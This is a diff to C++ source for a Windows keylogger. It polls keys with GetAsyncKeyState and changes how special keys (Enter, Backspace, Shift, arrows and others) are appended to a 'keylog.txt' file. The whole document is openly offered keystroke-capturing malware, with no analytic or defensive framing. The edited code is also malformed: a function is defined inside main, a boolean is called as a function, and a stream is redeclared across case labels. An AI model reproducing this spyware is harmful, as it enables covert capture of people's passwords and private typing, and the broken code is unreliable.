@@ -10,10 +10,13 @@ using namespace std;
 
 int main()
 {
-	int S_key;
+	
 	string keystroke;
+	bool special_keys;
 	
-	
+	special_keys(int S_key)
+	{
+		
 	switch (S_key) 
 	{
 	case VK_SPACE:
@@ -28,54 +31,128 @@ int main()
 		return true;
 	case VK_RETURN:
 		cout << "\n";
-		LOG("\n");
+		fstream logFile;
+  		logFile.open("keylog.txt", fstream::app);
+  		if(logFile.is_open())
+ 		{
+    			logFile << "\n";
+    			logFile.close();
+  		}
 		return true;
 	case VK_BACK:
 		cout << "\b";
-		LOG("\b");
+		fstream logFile;
+  		logFile.open("keylog.txt", fstream::app);
+  		if(logFile.is_open())
+ 		{
+    			logFile << "\b";
+    			logFile.close();
+  		}
 		return true;
 	case VK_OEM_PERIOD:
 		cout << ".";
-		LOG(".");
+		fstream logFile;
+  		logFile.open("keylog.txt", fstream::app);
+  		if(logFile.is_open())
+ 		{
+    			logFile << ".";
+    			logFile.close();
+  		}
 		return true;
 	case VK_OEM_COMMA:
 		cout << ",";
-		LOG(",");
+		fstream logFile;
+  		logFile.open("keylog.txt", fstream::app);
+  		if(logFile.is_open())
+ 		{
+    			logFile << ",";
+    			logFile.close();
+  		}
 		return true;
 	case VK_OEM_7:
 		cout << "'";
-		LOG("'");
+		fstream logFile;
+  		logFile.open("keylog.txt", fstream::app);
+  		if(logFile.is_open())
+ 		{
+    			logFile << "'";
+    			logFile.close();
+  		}
 		return true;
 	case VK_SHIFT:
 		cout << "#SHIFT#";
-		LOG("#SHIFT#");
+		fstream logFile;
+  		logFile.open("keylog.txt", fstream::app);
+  		if(logFile.is_open())
+ 		{
+    			logFile << "#SHIFT#";
+    			logFile.close();
+  		}
 		return true;
 	case VK_CAPITAL:
 		cout << "#CAPS_LOCK#";
-		LOG("#CAPS_LOCK");
+		fstream logFile;
+  		logFile.open("keylog.txt", fstream::app);
+  		if(logFile.is_open())
+ 		{
+    			logFile << "#CAPS_LOCK";
+    			logFile.close();
+  		}
 		return true;
 	case VK_TAB:
 		cout << "#TAB";
-		LOG("#TAB");
+		fstream logFile;
+  		logFile.open("keylog.txt", fstream::app);
+  		if(logFile.is_open())
+ 		{
+    			logFile << "#TAB";
+    			logFile.close();
+  		}
 		return true;
 	case VK_UP:
 		cout << "#UP";
-		LOG("#UP_ARROW");
+		fstream logFile;
+  		logFile.open("keylog.txt", fstream::app);
+  		if(logFile.is_open())
+ 		{
+    			logFile << "#UP";
+    			logFile.close();
+  		}
 		return true;
 	case VK_DOWN:
 		cout << "#DOWN";
-		LOG("#DOWN_ARROW");
+		fstream logFile;
+  		logFile.open("keylog.txt", fstream::app);
+  		if(logFile.is_open())
+ 		{
+    			logFile << "#DOWN";
+    			logFile.close();
+  		}
 		return true;
 	case VK_LEFT:
 		cout << "#LEFT";
-		LOG("#LEFT_ARROW");
+		fstream logFile;
+  		logFile.open("keylog.txt", fstream::app);
+  		if(logFile.is_open())
+ 		{
+    			logFile << "#LEFT";
+    			logFile.close();
+  		}
 		return true;
 	case VK_RIGHT:
 		cout << "#RIGHT";
-		LOG("#RIGHT_ARROW");
+		fstream logFile;
+  		logFile.open("keylog.txt", fstream::app);
+  		if(logFile.is_open())
+ 		{
+    			logFile << "#RIGHT";
+    			logFile.close();
+  		}
 		return true;
 	default: 
 		return false;
+	}
+
 	}
 	
 	
@@ -88,9 +165,8 @@ int main()
 		{
 			if (GetAsyncKeyState(key) == -32767)
       			{
-				SpecialKeys(S_key);
 					
-				if (SpecialKeys(key) == false) //Checks to see if a special key was pressed
+				if (special_keys(key) == false) //Checks to see if a special key was pressed
         			{
 						
 					fstream logFile;
